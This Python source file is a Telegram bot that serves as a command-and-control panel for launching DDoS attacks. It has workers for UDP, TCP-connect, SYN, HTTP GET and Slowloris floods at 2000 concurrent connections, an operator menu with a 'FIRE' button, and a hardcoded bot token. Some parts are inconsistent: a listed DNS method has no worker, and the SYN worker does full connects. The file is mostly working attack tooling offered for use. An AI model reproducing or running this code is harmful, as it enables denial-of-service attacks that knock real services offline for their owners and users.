# bot.py — Telegram DDoS C2 with full inline keyboard
# Python 3.11+ | python-telegram-bot>=21.0 | aiohttp>=3.9 | uvloop
# Deps: pip install python-telegram-bot aiohttp uvloop
# *Watch: ptb v21 changed callback_data limit to 64 bytes — keep method IDs short*

import asyncio
import logging
import random
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

import aiohttp
import uvloop
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

# ─── CONFIG ────────────────────────────────────────────────────────────────
BOT_TOKEN   = "8609020652:AAGfB1x4D1NlSBDF7YGBkAcKqir5efkO5II"
ADMIN_IDS   = {8086581937}          # whitelist operator
MAX_CONC    = 2000                 # concurrent sockets per attack
DEFAULT_DUR = 120                  # seconds
COOLDOWN    = 15                   # seconds per user between attacks

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    level=logging.INFO
)
log = logging.getLogger("c2")

# ─── ATTACK METHODS ────────────────────────────────────────────────────────
class Method(str, Enum):
    UDP     = "udp"
    TCP     = "tcp"
    HTTP    = "http"
    SYN     = "syn"
    SLOW    = "slow"
    DNS     = "dns"

METHOD_INFO = {
    Method.UDP:  ("UDP Flood",     "raw UDP packets, max pps"),
    Method.TCP:  ("TCP Connect",   "full handshake flood"),
    Method.HTTP: ("HTTP GET",      "layer-7 request flood"),
    Method.SYN:  ("TCP SYN",       "half-open handshake spam"),
    Method.SLOW: ("Slowloris",     "hold connections open"),
    Method.DNS:  ("DNS Query",     "ANY-record reflection"),
}

# ─── STATE ─────────────────────────────────────────────────────────────────
@dataclass
class Target:
    host: str
    port: int
    method: Method
    duration: int
    concurrency: int

@dataclass
class AttackJob:
    id: str
    target: Target
    started: float = field(default_factory=time.time)
    sent: int = 0
    errors: int = 0
    task: Optional[asyncio.Task] = None

    @property
    def elapsed(self) -> float:
        return time.time() - self.started

    @property
    def remaining(self) -> int:
        return max(0, int(self.target.duration - self.elapsed))

    @property
    def pps(self) -> int:
        e = self.elapsed or 1
        return int(self.sent / e)

JOBS: dict[str, AttackJob] = {}
COOLDOWNS: dict[int, float] = {}

# ─── WORKERS ───────────────────────────────────────────────────────────────
async def _udp_worker(host: str, port: int, stop: asyncio.Event, job: AttackJob):
    loop = asyncio.get_running_loop()
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
    except Exception:
        return
    payload = random._urandom(1024)
    while not stop.is_set():
        try:
            await loop.sock_sendto(sock, payload, (host, port))
            job.sent += 1
        except Exception:
            job.errors += 1
            await asyncio.sleep(0)
    sock.close()

async def _tcp_worker(host: str, port: int, stop: asyncio.Event, job: AttackJob):
    while not stop.is_set():
        try:
            r, w = await asyncio.open_connection(host, port)
            w.write(b"GET / HTTP/1.1\r\nHost: %b\r\n\r\n" % host.encode())
            await w.drain()
            job.sent += 1
            w.close()
        except Exception:
            job.errors += 1
            await asyncio.sleep(0)

async def _syn_worker(host: str, port: int, stop: asyncio.Event, job: AttackJob):
    loop = asyncio.get_running_loop()
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            await loop.sock_connect(s, (host, port))
            job.sent += 1
            s.close()
        except Exception:
            job.errors += 1

async def _http_worker(url: str, stop: asyncio.Event, job: AttackJob, session: aiohttp.ClientSession):
    headers = {"User-Agent": f"Mozilla/5.0 ({random.randint(100,999)})"}
    while not stop.is_set():
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as r:
                await r.read()
                job.sent += 1
        except Exception:
            job.errors += 1

async def _slow_worker(host: str, port: int, stop: asyncio.Event, job: AttackJob):
    writers = []
    try:
        while not stop.is_set():
            try:
                r, w = await asyncio.open_connection(host, port)
                w.write(b"GET / HTTP/1.1\r\nHost: %b\r\nX-a: b\r\n" % host.encode())
                await w.drain()
                writers.append(w)
                job.sent += 1
            except Exception:
                job.errors += 1
            await asyncio.sleep(5)
    finally:
        for w in writers:
            try:
                w.close()
            except Exception:
                pass

# ─── ORCHESTRATOR ──────────────────────────────────────────────────────────
async def run_attack(job: AttackJob):
    t = job.target
    stop = asyncio.Event()
    workers = []

    if t.method == Method.HTTP:
        url = f"http://{t.host}:{t.port}/" if t.port not in (80, 443) else f"http://{t.host}/"
        connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
        async with aiohttp.ClientSession(connector=connector) as session:
            for _ in range(t.concurrency):
                workers.append(asyncio.create_task(_http_worker(url, stop, job, session)))
            await _wait_duration(stop, t.duration)
    else:
        fn = {
            Method.UDP: _udp_worker,
            Method.TCP: _tcp_worker,
            Method.SYN: _syn_worker,
            Method.SLOW: _slow_worker,
        }[t.method]
        for _ in range(t.concurrency):
            workers.append(asyncio.create_task(fn(t.host, t.port, stop, job)))
        await _wait_duration(stop, t.duration)

    stop.set()
    for w in workers:
        w.cancel()
    await asyncio.gather(*workers, return_exceptions=True)
    log.info(f"job {job.id} done — sent={job.sent} err={job.errors}")

async def _wait_duration(stop: asyncio.Event, dur: int):
    try:
        await asyncio.wait_for(stop.wait(), timeout=dur)
    except asyncio.TimeoutError:
        pass

# ─── TELEGRAM UI ───────────────────────────────────────────────────────────
MAIN_MENU = InlineKeyboardMarkup([
    [InlineKeyboardButton("🎯 New Attack", callback_data="menu:new")],
    [InlineKeyboardButton("📊 Active Jobs", callback_data="menu:jobs"),
     InlineKeyboardButton("⚙️ Methods",   callback_data="menu:methods")],
    [InlineKeyboardButton("📈 Stats",     callback_data="menu:stats"),
     InlineKeyboardButton("❌ Stop All",  callback_data="menu:stopall")],
])

def method_menu() -> InlineKeyboardMarkup:
    rows, row = [], []
    for m in Method:
        name, _ = METHOD_INFO[m]
        row.append(InlineKeyboardButton(name, callback_data=f"m:{m.value}"))
        if len(row) == 2:
            rows.append(row); row = []
    if row: rows.append(row)
    rows.append([InlineKeyboardButton("⬅️ Back", callback_data="menu:main")])
    return InlineKeyboardMarkup(rows)

def confirm_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 FIRE", callback_data="fire:go")],
        [InlineKeyboardButton("⬅️ Cancel", callback_data="menu:main")],
    ])

DRAFT: dict[int, dict] = {}   # user_id -> {host, port, method}

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

def cooldown_ok(uid: int) -> tuple[bool, int]:
    now = time.time()
    last = COOLDOWNS.get(uid, 0)
    if now - last < COOLDOWN:
        return False, int(COOLDOWN - (now - last))
    return True, 0

# ─── HANDLERS ──────────────────────────────────────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("⛔ not authorized")
        return
    await update.message.reply_text(
        "🩸 *C2 Panel Online*\n\nSelect action:",
        reply_markup=MAIN_MENU, parse_mode=ParseMode.MARKDOWN
    )

async def cmd_attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid): return
    args = ctx.args
    if len(args) < 3:
        await update.message.reply_text(
            "usage: /attack <host> <port> <method>\nmethods: " + ", ".join(m.value for m in Method)
        )
        return
    host, port_s, method_s = args[0], args[1], args[2].lower()
    try:
        port = int(port_s)
        method = Method(method_s)
    except (ValueError, KeyError):
        await update.message.reply_text("bad port or method")
        return
    DRAFT[uid] = {"host": host, "port": port, "method": method}
    await update.message.reply_text(
        f"🎯 Target: `{host}:{port}`\nMethod: *{METHOD_INFO[method][0]}*\n\nConfirm?",
        reply_markup=confirm_menu(), parse_mode=ParseMode.MARKDOWN
    )

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    await q.answer()
    if not is_admin(uid):
        await q.edit_message_text("⛔ not authorized")
        return

    data = q.data

    if data == "menu:main":
        await q.edit_message_text("🩸 *C2 Panel*", reply_markup=MAIN_MENU, parse_mode=ParseMode.MARKDOWN)
        return

    if data == "menu:methods":
        lines = ["*Attack Methods*\n"]
        for m in Method:
            n, d = METHOD_INFO[m]
            lines.append(f"• `{m.value}` — {n}\n  _{d}_")
        await q.edit_message_text("\n".join(lines),
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu:main")]]),
            parse_mode=ParseMode.MARKDOWN)
        return

    if data == "menu:jobs":
        if not JOBS:
            txt = "📭 no active jobs"
        else:
            lines = ["*Active Jobs*\n"]
            for jid, j in JOBS.items():
                lines.append(
                    f"`{jid}` → {j.target.host}:{j.target.port} [{j.target.method.value}]\n"
                    f"  sent={j.sent:,} pps={j.pps:,} left={j.remaining}s"
                )
            txt = "\n".join(lines)
        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("⬅️ Back", callback_data="menu:main")]]),
            parse_mode=ParseMode.MARKDOWN)
        return

    if data == "menu:stats":
        total = sum(j.sent for j in JOBS.values())
        errs  = sum(j.errors for j in JOBS.values())
        txt = (f"📈 *Stats*\n\n"
               f"Jobs active: `{len(JOBS)}`\n"
               f"Packets sent: `{total:,}`\n"
               f"Errors: `{errs:,}`")
        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("⬅️ Back", callback_data="menu:main")]]),
            parse_mode=ParseMode.MARKDOWN)
        return

    if data == "menu:stopall":
        for j in JOBS.values():
            if j.task: j.task.cancel()
        JOBS.clear()
        await q.edit_message_text("🛑 all jobs stopped", reply_markup=MAIN_MENU)
        return

    if data == "menu:new":
        await q.edit_message_text(
            "Send target in format:\n`host port method`\n\nExample:\n`1.2.3.4 80 http`\n`example.com 53 dns`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu:main")]]),
            parse_mode=ParseMode.MARKDOWN)
        ctx.user_data["awaiting"] = "target"
        return

    if data.startswith("m:"):
        # quick-method select for latest draft
        if uid not in DRAFT:
            await q.edit_message_text("no draft — start over", reply_markup=MAIN_MENU)
            return
        DRAFT[uid]["method"] = Method(data[2:])
        d = DRAFT[uid]
        await q.edit_message_text(
            f"🎯 `{d['host']}:{d['port']}`\nMethod: *{METHOD_INFO[d['method']][0]}*\n\nConfirm?",
            reply_markup=confirm_menu(), parse_mode=ParseMode.MARKDOWN)
        return

    if data == "fire:go":
        ok, wait = cooldown_ok(uid)
        if not ok:
            await q.answer(f"cooldown: {wait}s", show_alert=True)
            return
        d = DRAFT.get(uid)
        if not d:
            await q.edit_message_text("no draft", reply_markup=MAIN_MENU); return
        t = Target(host=d["host"], port=d["port"], method=d["method"],
                   duration=DEFAULT_DUR, concurrency=MAX_CONC)
        jid = f"j{int(time.time())%100000}"
        job = AttackJob(id=jid, target=t)
        JOBS[jid] = job
        COOLDOWNS[uid] = time.time()
        job.task = asyncio.create_task(run_attack(job))
        await q.edit_message_text(
            f"🚀 *FIRED*\n\n"
            f"ID: `{jid}`\n"
            f"Target: `{t.host}:{t.port}`\n"
            f"Method: *{METHOD_INFO[t.method][0]}*\n"
            f"Duration: `{t.duration}s`\n"
            f"Concurrency: `{t.concurrency}`",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("📊 Jobs", callback_data="menu:jobs")],
                 [InlineKeyboardButton("⬅️ Menu", callback_data="menu:main")]]),
            parse_mode=ParseMode.MARKDOWN)
        return

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid): return
    if ctx.user_data.get("awaiting") != "target": return
    parts = update.message.text.strip().split()
    if len(parts) != 3:
        await update.message.reply_text("format: host port method"); return
    host, port_s, method_s = parts
    try:
        port = int(port_s)
        method = Method(method_s.lower())
    except (ValueError, KeyError):
        await update.message.reply_text("bad port/method"); return
    DRAFT[uid] = {"host": host, "port": port, "method": method}
    ctx.user_data["awaiting"] = None
    await update.message.reply_text(
        f"🎯 `{host}:{port}`\nMethod: *{METHOD_INFO[method][0]}*\n\nConfirm?",
        reply_markup=confirm_menu(), parse_mode=ParseMode.MARKDOWN)

async def cmd_jobs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not JOBS:
        await update.message.reply_text("no active jobs"); return
    for jid, j in JOBS.items():
        await update.message.reply_text(
            f"`{jid}` {j.target.host}:{j.target.port} [{j.target.method.value}] "
            f"sent={j.sent:,} pps={j.pps:,} left={j.remaining}s",
            parse_mode=ParseMode.MARKDOWN)

async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    jid = ctx.args[0] if ctx.args else None
    if jid and jid in JOBS:
        j = JOBS.pop(jid)
        if j.task: j.task.cancel()
        await update.message.reply_text(f"stopped {jid}")
    else:
        await update.message.reply_text("usage: /stop <job_id>")

async def cmd_stopall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    for j in JOBS.values():
        if j.task: j.task.cancel()
    JOBS.clear()
    await update.message.reply_text("🛑 all stopped")

# ─── BOOT ──────────────────────────────────────────────────────────────────
async def post_init(app: Application):
    await app.bot.set_my_commands([
        BotCommand("start",    "open panel"),
        BotCommand("attack",   "attack <host> <port> <method>"),
        BotCommand("jobs",     "list active jobs"),
        BotCommand("stop",     "stop <job_id>"),
        BotCommand("stopall",  "stop everything"),
    ])

def main():
    uvloop.install()
    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .build()
    )
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("jobs", cmd_jobs))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("stopall", cmd_stopall))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    log.info("C2 online")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    import socket  # needed by _udp_worker at runtime
    main()
